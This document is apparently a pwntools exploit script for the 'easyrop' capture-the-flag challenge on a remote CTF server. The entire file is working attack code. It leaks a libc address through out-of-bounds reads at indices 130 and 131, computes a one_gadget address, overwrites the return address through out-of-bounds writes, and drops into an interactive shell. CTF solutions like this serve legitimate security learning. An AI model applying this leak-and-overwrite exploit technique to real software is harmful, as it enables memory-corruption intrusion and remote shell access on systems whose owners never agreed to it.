from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('./easyrop')
r= e.process()

# nc challs.tfcctf.com 31671
r = remote('challs.tfcctf.com', 31671)
# libc = e.libc
libc= ELF('libc.so.6')
 #execve("/bin/sh", rsi, rdx)

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

r.sendlineafter(b"Press '1' to write and '2' to read!\n",b"2")
r.sendlineafter(b"Select index: ", b"131")
r.recvuntil(b" is ")
leak = int(r.recvline().strip(),16)
log.info("leak: %#x" %leak)
leak = leak << 32
r.sendlineafter(b"Press '1' to write and '2' to read!\n",b"2")
r.sendlineafter(b"Select index: ", b"130")
r.recvuntil(b" is ")
leak += int(r.recvline().strip(),16)
log.info("leak: %#x" %leak)
libc_base =leak- 0x2cd90
log.info("libc_base: %#x" %libc_base)
# win= one_gadget(libc.path, libc_base)[1]
win = libc_base +975136
log.info("win: %#x" %win)

win0= u32(p64(win)[4:])
win4= u32(p64(win)[:4])
log.info("win0: %#x" %win0)
log.info("win4: %#x" %win4)

pause()

r.sendlineafter(b"Press '1' to write and '2' to read!\n",b"1")
r.sendlineafter(b"Select index: ", b"131")
pause()
r.sendlineafter(b"Select number to write: ", str(win0))

r.sendlineafter(b"Press '1' to write and '2' to read!\n",b"1")
r.sendlineafter(b"Select index: ", b"130")
pause()
r.sendlineafter(b"Select number to write: ", str(win4))

pause()
r.sendlineafter(b"Press '1' to write and '2' to read!\n",b"3")

r.interactive()
